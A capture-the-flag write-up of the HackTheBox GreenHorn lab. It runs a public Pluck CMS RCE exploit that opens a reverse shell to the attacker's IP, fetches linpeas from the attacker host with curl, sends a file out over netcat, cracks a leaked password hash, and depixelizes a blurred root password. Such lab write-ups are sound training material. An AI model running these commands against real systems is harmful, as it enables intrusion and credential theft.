# HackTheBox GreenHorn Writeup — Pluck CMS RCE to Root via Depixelization

## Machine Overview

| Property     | Value                  |
|-------------|------------------------|
| Platform    | HackTheBox             |
| Name        | GreenHorn              |
| Difficulty  | Easy                   |
| OS          | Linux                  |

## Reconnaissance and Port Scanning

Add the IP address of the target to the `/etc/hosts` file.

![[HackTheBox/GreenHorn/images/1.png]]

Conduct a port scan first:

```bash
sudo nmap -sV -sC --max-rate=10000 greenhorn.htb
```

![[HackTheBox/GreenHorn/images/2.png]]

## Web Application Discovery

I navigated to port `80` to check whether there is a static page or a running application.

![[HackTheBox/GreenHorn/images/3.png]]

I clicked on both page anchor tags, which redirected me to two separate applications: `Pluck 4.7.18` and `Plesk Obsidian 18.0.77`.

## Exploiting Pluck CMS 4.7.18 — Finding the RCE Vector

Found an exploit for `Pluck 4.7.18`:

![[HackTheBox/GreenHorn/images/4.png]]

Since we need to get access on the target host, I will use the `RCE` exploit.

```bash
cp /usr/share/exploitdb/exploits/php/webapps/51592.py .
```

Normally, it requires you to download a module called `requests_toolbelt`.

![[HackTheBox/GreenHorn/images/5.png]]

It asked for a zip file for exploitation, yet I found another version that automatically creates and uploads a malicious payload:

[Pluck_Cms_4.7.18_RCE_Exploit](https://github.com/b0ySie7e/Pluck_Cms_4.7.18_RCE_Exploit)

I could not proceed with the exploit at this point because it requires admin authentication. Let's move on to port `3000`.

## Enumerating Gitea on Port 3000

I began to fuzz the repository management system on port 3000.

```bash
dirsearch -u http://greenhorn.htb:3000 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```

![[HackTheBox/GreenHorn/images/7.png]]

During the process, I also manually checked pages beginning with the `repos` endpoint, which looked interesting:

![[HackTheBox/GreenHorn/images/6.png]]

## Extracting Credentials from the Git Repository

I decided to check the repository manually for any credentials:

![[HackTheBox/GreenHorn/images/8.png]]

Checking the commit history first is much more useful compared to file-by-file checks:

http://greenhorn.htb:3000/GreenAdmin/GreenHorn/commit/d3278c32f25df1c2ae16c092b8d383d68bce977d

![[HackTheBox/GreenHorn/images/10.png]]

Manual approaches are a burden, so I discovered a page that automatically reveals secrets. At the same time, `trufflehog` did not find anything.

Clone the repo:

```bash
git clone http://greenhorn.htb:3000/GreenAdmin/GreenHorn
```

This cheatsheet worked very well in my case:

[Mining Creds](https://notes.benheater.com/books/web/page/mining-data-from-git-repos)

![[HackTheBox/GreenHorn/images/11.png]]

I did not find juicy data in the mining results, so I checked the `security`, `settings`, `changepass`, and `options` files.

![[HackTheBox/GreenHorn/images/12.png]]

## Cracking the SHA-512 Password Hash

In `changepass.php`, it references another location containing a password file with a `SHA512` hash.

![[HackTheBox/GreenHorn/images/13.png]]

The file has a dependency on another `php` file:

![[HackTheBox/GreenHorn/images/14.png]]

`d5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163`

```bash
hash-identifier
```

![[HackTheBox/GreenHorn/images/15.png]]

No need to use `Hashcat` or `John` — I used `CrackStation`'s rainbow table directly.

https://crackstation.net/

![[HackTheBox/GreenHorn/images/16.png]]

## Initial Access — Pluck CMS Admin Panel and RCE

I'll try `admin:iloveyou1`.

Navigating to the login panel:

http://greenhorn.htb/login.php

![[HackTheBox/GreenHorn/images/17.png]]

Let's run the exploit I mentioned previously:

```bash
python exploit_pluckv4.7.18_RCE.py                                 
usage: exploit_pluckv4.7.18_RCE.py [-h] --password PASSWORD [--filename FILENAME] --ip IP --port PORT
                                   --host HOST
exploit_pluckv4.7.18_RCE.py: error: the following arguments are required: --password, --ip, --port, --host
```

The developer suggests the following usage:

https://github.com/b0ySie7e/Pluck_Cms_4.7.18_RCE_Exploit

```bash
python3 exploit_pluckv4.7.18_RCE.py --password your_password --ip 10.10.10.10 --port 443 --host http://127.0.0.1
```

I ran it like this:

```bash
python3 exploit_pluckv4.7.18_RCE.py --password iloveyou1 --ip 10.10.16.64 --port 443 --host http://greenhorn.htb
```

![[HackTheBox/GreenHorn/images/18.png]]

I got a web user shell:

![[HackTheBox/GreenHorn/images/19.png]]

## Lateral Movement — From www-data to Junior

My permissions were not enough to read the user flag because I did not have `junior` user's privileges. I ran `linpeas` to enumerate the target.

```bash
# Attacker
python -m http.server 1000

# Target
curl http://10.10.16.64:1000/linpeas.sh -o linpeas.sh
```

Now chmod the file and run it.

![[HackTheBox/GreenHorn/images/20.png]]

I did not find potential vectors, yet I decided to try the `iloveyou1` password to move laterally towards the `junior` user.

```bash
su junior
iloveyou1
```

![[HackTheBox/GreenHorn/images/21.png]]

Get the user flag:

```bash
cat /home/junior/user.txt
```

## Privilege Escalation — Depixelizing the Root Password from a PDF

On the home directory, there was a PDF file. I was not able to analyze its metadata from the target environment, and `scp` was not possible. Then I noticed that `netcat` could be used to transfer the file.

```bash
# Local
nc -lvnp 4444 > "Using_OpenVAS.pdf"

# Target
nc 10.10.16.64 4444 < "/home/junior/Using OpenVAS.pdf"
```

The password field was blurred, so I had to find a way to reveal it.

![[HackTheBox/GreenHorn/images/22.png]]

The blurred password information was an image, so I manually extracted it and started researching a way to recover it.

Found an article about this topic:

https://thehackernews.com/2022/02/this-new-tool-can-retrieve-pixelated.html

![[HackTheBox/GreenHorn/images/23.png]]

Then I found the tool:

https://github.com/spipm/Depixelization_poc

I ran it like this:

```bash
python3 depix.py \
    -p /home/kali/Desktop/asd.png \   
    -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png \
    -o /home/kali/Desktop/output.png
```

![[HackTheBox/GreenHorn/images/24.png]]

Let's check:

![[HackTheBox/GreenHorn/images/25.png]]

`sidefromsidetheothersidesidefromsidetheotherside` is the password I recovered.

Yes, I got it after 2 hours!

![[HackTheBox/GreenHorn/images/26.png]]

Get the root flag:

```bash
cat /root/root.txt
```

## Key Takeaways

- **Password reuse** across services (Pluck CMS and SSH) enabled lateral movement from `www-data` to `junior`.
- **Exposed Git repositories** on Gitea leaked sensitive configuration files containing hashed credentials.
- **Weak password hashing** combined with a common password (`iloveyou1`) made cracking trivial via rainbow tables.
- **Pixelated/blurred passwords in PDFs** are not secure — depixelization tools can recover the original text.
